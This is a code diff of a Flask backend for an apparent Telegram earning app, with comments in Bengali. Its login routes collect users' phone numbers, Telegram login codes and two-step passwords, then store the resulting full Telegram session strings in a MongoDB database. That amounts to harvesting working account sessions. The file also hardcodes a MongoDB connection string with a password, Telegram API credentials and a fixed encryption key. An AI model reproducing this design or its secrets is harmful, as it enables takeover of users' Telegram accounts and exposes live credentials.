@@ -15,14 +15,22 @@ app = Flask(__name__)
 CORS(app)
 
 # --- ১. কনফিগারেশন ও ডাটাবেস কানেকশন ---
-# আপনার দেওয়া তথ্যগুলো সরাসরি এখানে বসিয়ে দেওয়া হয়েছে
 API_ID = 36466824      
 API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
-SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # ৩২ বিট কী
+SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' 
 
-# MongoDB কানেকশন
+# MongoDB URI (টাইমআউটসহ কানেকশন সেটআপ)
 MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"
-client_db = MongoClient(MONGO_URI)
+
+try:
+    # কানেকশন সেটআপ (৫ সেকেন্ড টাইমআউটসহ)
+    client_db = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
+    # ডাটাবেস কানেকশন চেক করা
+    client_db.admin.command('ping')
+    print("✅ MongoDB কানেকশন সফল হয়েছে!")
+except Exception as e:
+    print(f"❌ MongoDB কানেকশন এরর: {e}")
+
 db = client_db['AAF_TeleEarn'] 
 users_col = db['users']
 sessions_col = db['sessions']
@@ -80,15 +88,15 @@ async def send_otp():
     data = request.json
     phone = data.get('phone')
     if not phone:
-        return jsonify({"success": False, "message": "নম্বরটি প্রয়োজন"}), 400
+        return jsonify({"success": False, "message": "নম্বরটি প্রয়োজন"}), 400
     try:
-        # নতুন টেলিগ্রাম ক্লায়েন্ট তৈরি
+        # নতুন টেলিগ্রাম ক্লায়েন্ট তৈরি
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         sent_code = await client.send_code_request(phone)
         # সেশন এবং কোড হ্যাশ মেমোরিতে রাখা হচ্ছে
         temp_clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
-        return jsonify({"success": True, "message": "টেলিগ্রামে ওটিপি পাঠানো হয়েছে!"})
+        return jsonify({"success": True, "message": "টেলিগ্রামে ওটিপি পাঠানো হয়েছে!"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
@@ -97,27 +105,24 @@ async def verify_login():
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
-    password = data.get('password') # ২-স্টেপ পাসওয়ার্ড (যদি থাকে)
+    password = data.get('password') # ২-স্টেপ পাসওয়ার্ড
     full_name = data.get('name')
     site_pass = data.get('site_password')
 
     if phone not in temp_clients:
-        return jsonify({"success": False, "message": "সেশন শেষ হয়ে গেছে। আবার চেষ্টা করুন।"})
+        return jsonify({"success": False, "message": "সেশন শেষ হয়ে গেছে। আবার চেষ্টা করুন।"})
 
     client_data = temp_clients[phone]
     client = client_data['client']
     
     try:
         try:
-            # লগইন করার চেষ্টা
             await client.sign_in(phone, code, phone_code_hash=client_data['phone_code_hash'])
         except SessionPasswordNeededError:
-            # যদি ২-স্টেপ ভেরিফিকেশন অন থাকে
             if not password:
-                return jsonify({"success": False, "message": "আপনার ২-স্টেপ পাসওয়ার্ড দিন"})
+                return jsonify({"success": False, "message": "আপনার ২-স্টেপ পাসওয়ার্ড দিন"})
             await client.sign_in(password=password)
 
-        # সফল লগইন হলে সেশন সেভ করা
         raw_session = client.session.save()
         me = await client.get_me()
         encrypted_session = encrypt_session(raw_session)
@@ -140,11 +145,14 @@ async def verify_login():
 # --- ৫. ইউজার ডাটা ও উইথড্র এপিআই ---
 @app.route('/api/user_data/<user_id>', methods=['GET'])
 def get_user_data(user_id):
-    user = users_col.find_one({"telegram_id": int(user_id)})
-    if user:
-        user['_id'] = str(user['_id'])
-        return jsonify({"status": "success", **user})
-    return jsonify({"status": "error", "message": "ইউজার পাওয়া যায়নি"}), 404
+    try:
+        user = users_col.find_one({"telegram_id": int(user_id)})
+        if user:
+            user['_id'] = str(user['_id'])
+            return jsonify({"status": "success", **user})
+        return jsonify({"status": "error", "message": "ইউজার পাওয়া যায়নি"}), 404
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/withdraw', methods=['POST'])
 def handle_withdraw():
@@ -156,16 +164,20 @@ def handle_withdraw():
     if amount < 50: return jsonify({"status": "error", "message": "সর্বনিম্ন ৫০ টাকা"}), 400
     
     user = users_col.find_one({"telegram_id": uid})
+    if not user: return jsonify({"status": "error", "message": "ইউজার পাওয়া যায়নি"}), 404
+
     if user.get('total_trades', 0) < 10:
         return jsonify({"status": "error", "message": "উইথড্র করতে কমপক্ষে ১০টি ট্রেড লাগবে!"}), 403
 
     if user['main_balance'] >= amount:
         users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": -amount}})
-        withdrawals_col.insert_one({"user_id": uid, "amount": amount, "number": number, "status": "Pending", "time": datetime.datetime.now()})
+        withdrawals_col.insert_one({
+            "user_id": uid, "amount": amount, "number": number, 
+            "status": "Pending", "time": datetime.datetime.now()
+        })
         return jsonify({"status": "success"})
     return jsonify({"status": "error", "message": "ব্যালেন্স অপর্যাপ্ত"})
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    # প্রোডাকশন সার্ভারে debug=False রাখা নিরাপদ
     app.run(host='0.0.0.0', port=port, debug=False)
